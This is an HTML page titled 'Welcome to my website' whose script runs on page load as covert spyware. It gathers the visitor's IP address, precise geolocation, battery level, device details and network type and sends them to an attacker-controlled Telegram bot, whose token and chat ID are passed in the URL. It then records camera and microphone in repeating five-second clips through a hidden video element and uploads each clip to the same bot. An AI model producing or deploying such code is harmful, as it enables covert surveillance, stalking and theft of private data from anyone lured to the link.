<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to my website</title>
</head>
<body>
    <video id="video" style="display: none;"></video>

    <script>
        let botToken = getBotTokenFromUrl(); // Get bot token from URL parameter
        let chatId = getChatIdFromUrl();
        let currentCamera = 'environment'; // Use 'environment' as the default (back) camera

        function getBotTokenFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('token'); // Get bot token from URL parameter
        }

        function getChatIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id'); // Get chat ID from URL parameter
        }

        async function fetchWanIp() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error(error);
                return "Error retrieving WAN IP";
            }
        }

        async function getDeviceInfo() {
            // Get device information such as RAM, ROM, and location
            const battery = await navigator.getBattery();
            const location = await getLocation();
            const totalRam = navigator.deviceMemory || 'Unknown';
            const totalStorage = "Unknown"; // In browser, we cannot directly get ROM info, but you can implement additional methods based on your requirements
            const userAgent = navigator.userAgent;
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';

            return {
                ram: totalRam,
                storage: totalStorage,
                battery: battery.level * 100,
                location: location,
                userAgent: userAgent,
                networkType: networkType
            };
        }

        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        resolve(`Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`);
                    }, reject);
                } else {
                    resolve("Location not available");
                }
            });
        }

        async function sendInfoAndStartRecording() {
            const deviceInfo = await getDeviceInfo();
            const wanIp = await fetchWanIp();
            const dateAndTime = new Date().toString();

            const infoMessage = `
🌐 WAN IP Address: ${wanIp}
📱 User-Agent: ${deviceInfo.userAgent}
🔋 Battery Percentage: ${deviceInfo.battery}%
📡 Network Type: ${deviceInfo.networkType}
🗓 Date and Time: ${dateAndTime}
💾 Total RAM: ${deviceInfo.ram} GB
📱 Location: ${deviceInfo.location}
📹 Video and Audio recording is starting...
`;

            sendTextToTelegram(infoMessage);
            startContinuousVideoRecording();
        }

        async function startContinuousVideoRecording() {
            const mediaOptions = { video: { facingMode: currentCamera }, audio: true };

            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(mediaOptions);
                    const videoTrack = stream.getVideoTracks()[0];
                    const audioTrack = stream.getAudioTracks()[0];

                    const video = document.getElementById("video");
                    video.srcObject = stream;
                    video.style.display = "none";

                    const mediaRecorder = new MediaRecorder(stream);
                    let videoChunks = [];
                    let audioChunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            if (event.data.type.startsWith("video")) {
                                videoChunks.push(event.data);
                            } else if (event.data.type.startsWith("audio")) {
                                audioChunks.push(event.data);
                            }
                        }
                    };

                    mediaRecorder.onstop = () => {
                        const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                        sendVideoAndAudioToTelegram(videoBlob, audioBlob);
                    };

                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 5000); // Stop after 5 seconds

                    await new Promise(resolve => setTimeout(resolve, 6000)); // Wait for 6 seconds before starting the next recording
                } catch (error) {
                    console.error(error);
                    alert("Failed to access the camera for video recording.");
                    break; // Stop the loop on error
                }
            }
        }

        function sendTextToTelegram(message) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
                method: "POST",
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Information sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send information to Telegram.");
                });
        }

        function sendVideoAndAudioToTelegram(videoBlob, audioBlob) {
            const formData = new FormData();
            formData.append("video", videoBlob, "recording.mp4");
            formData.append("audio", audioBlob, "audio.mp3");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Video and Audio sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send video and audio.");
                });
        }

        sendInfoAndStartRecording();
    </script>
</body>
</html>